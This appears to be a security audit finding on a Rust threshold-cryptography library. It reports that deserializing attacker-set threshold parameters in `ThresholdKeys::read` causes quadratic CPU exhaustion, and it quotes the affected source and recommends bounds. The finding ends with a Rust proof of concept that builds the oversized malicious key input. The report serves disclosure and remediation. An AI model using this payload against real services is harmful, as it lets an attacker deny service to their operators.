[1](#0-0) ### Title
Attacker-controlled threshold parameters trigger quadratic CPU exhaustion during `ThresholdKeys` deserialization - (File: crypto/dkg/src/lib.rs)

### Summary
`ThresholdKeys::read` accepts attacker-supplied `t`, `n`, participant index, interpolation type, secret-share encoding, and `n` verification-share encodings. [2](#0-1)  When `Interpolation::Lagrange` is selected, `ThresholdKeys::new` computes an interpolation factor independently for every one of the first `t` participants. [3](#0-2)  Each factor calculation iterates over the full signing set and performs a field inversion, producing `O(t²)` field arithmetic and `O(t)` inversions. [4](#0-3) 

### Finding Description
A serialized key can set `t = n = u16::MAX` and select Lagrange interpolation while providing syntactically valid scalar and point encodings. [5](#0-4)  Deserialization then calls `ThresholdKeys::new`, whose group-key derivation evaluates `interpolation_factor` once per participant. [6](#0-5)  With the maximum permitted parameters, this results in approximately 4.3 billion inner-loop iterations from an input only a few megabytes in size.

### Impact Explanation
An unauthenticated input delivered to `ThresholdKeys::read` can monopolize CPU and stall the process handling the serialized key material. This is an algorithmic-complexity denial-of-service analogue to catastrophic regular-expression backtracking: a compact public input causes work disproportionate to its size. Because participant indexes and threshold sizes are bounded by `u16`, the issue is Medium rather than Critical or High. [1](#0-0) 

### Likelihood Explanation
The payload does not require valid secret-sharing semantics or a valid signature; it only needs canonical scalar and point encodings and internally consistent `t <= n` and `i <= n` parameters. [6](#0-5)  Exploitation requires an integration path that feeds attacker-controlled bytes to `ThresholdKeys::read`, which is an explicitly exposed public deserialization API. [7](#0-6) 

### Recommendation
Bound serialized `t`/`n` to the maximum supported deployment size before constructing `ThresholdKeys`. For large legitimate sets, compute all Lagrange factors with shared prefix/suffix products rather than recalculating each participant independently, or cache precomputed interpolation coefficients during key generation. The expensive group-key derivation could also be deferred or performed only after stricter contextual limits are known. [4](#0-3) 

### Proof of Concept
```rust
use frost::{curve::Curve, ThresholdKeys};
use ciphersuite::group::ff::{Field, PrimeField};

fn malicious_threshold_keys<C: Curve>() -> Vec<u8> {
  let max = u16::MAX;
  let mut bytes = Vec::new();

  bytes.extend((C::ID.len() as u32).to_le_bytes());
  bytes.extend(C::ID);

  bytes.extend(max.to_le_bytes()); // t
  bytes.extend(max.to_le_bytes()); // n
  bytes.extend(1u16.to_le_bytes()); // participant i

  bytes.push(1); // Interpolation::Lagrange
  bytes.extend(C::F::ONE.to_repr().as_ref()); // secret share

  let point = C::generator().to_bytes();
  for _ in 0 .. max {
    bytes.extend(point.as_ref()); // canonical verification share
  }

  bytes
}

fn trigger<C: Curve>() {
  let bytes = malicious_threshold_keys::<C>();
  let _ = ThresholdKeys::<C>::read(&mut bytes.as_slice());
}
```

This input causes `ThresholdKeys::new` to compute the group key over all 65,535 participants, while each Lagrange factor separately scans the full participant list. [3](#0-2)

### Citations

**File:** crypto/dkg/src/lib.rs (L226-247)
```rust
  fn interpolation_factor(&self, i: Participant, included: &[Participant]) -> F {
    match self {
      Interpolation::Constant(c) => c[usize::from(u16::from(i) - 1)],
      Interpolation::Lagrange => {
        let i_f = F::from(u64::from(u16::from(i)));

        let mut num = F::ONE;
        let mut denom = F::ONE;
        for l in included {
          if i == *l {
            continue;
          }

          let share = F::from(u64::from(u16::from(*l)));
          num *= share;
          denom *= share - i_f;
        }

        // Safe as this will only be 0 if we're part of the above loop
        // (which we have an if case to avoid)
        num * denom.invert().unwrap()
      }
```

**File:** crypto/dkg/src/lib.rs (L376-378)
```rust
    let t = (1 ..= params.t()).map(Participant).collect::<Vec<_>>();
    let group_key =
      t.iter().map(|i| verification_shares[i] * interpolation.interpolation_factor(*i, &t)).sum();
```

**File:** crypto/dkg/src/lib.rs (L573-574)
```rust
  /// Read keys from a type satisfying `std::io::Read`.
  pub fn read<R: io::Read>(reader: &mut R) -> io::Result<ThresholdKeys<C>> {
```

**File:** crypto/dkg/src/lib.rs (L591-631)
```rust
    let (t, n, i) = {
      let mut read_u16 = || -> io::Result<u16> {
        let mut value = [0; 2];
        reader.read_exact(&mut value)?;
        Ok(u16::from_le_bytes(value))
      };
      (
        read_u16()?,
        read_u16()?,
        Participant::new(read_u16()?).ok_or(io::Error::other("invalid participant index"))?,
      )
    };

    let mut interpolation = [0];
    reader.read_exact(&mut interpolation)?;
    let interpolation = match interpolation[0] {
      0 => Interpolation::Constant({
        let mut res = Vec::with_capacity(usize::from(n));
        for _ in 0 .. n {
          res.push(C::read_F(reader)?);
        }
        res
      }),
      1 => Interpolation::Lagrange,
      _ => Err(io::Error::other("invalid interpolation method"))?,
    };

    let secret_share = Zeroizing::new(C::read_F(reader)?);

    let mut verification_shares = HashMap::new();
    for l in (1 ..= n).map(Participant) {
      verification_shares.insert(l, <C as Ciphersuite>::read_G(reader)?);
    }

    ThresholdKeys::new(
      ThresholdParams::new(t, n, i).map_err(io::Error::other)?,
      interpolation,
      secret_share,
      verification_shares,
    )
    .map_err(io::Error::other)
```
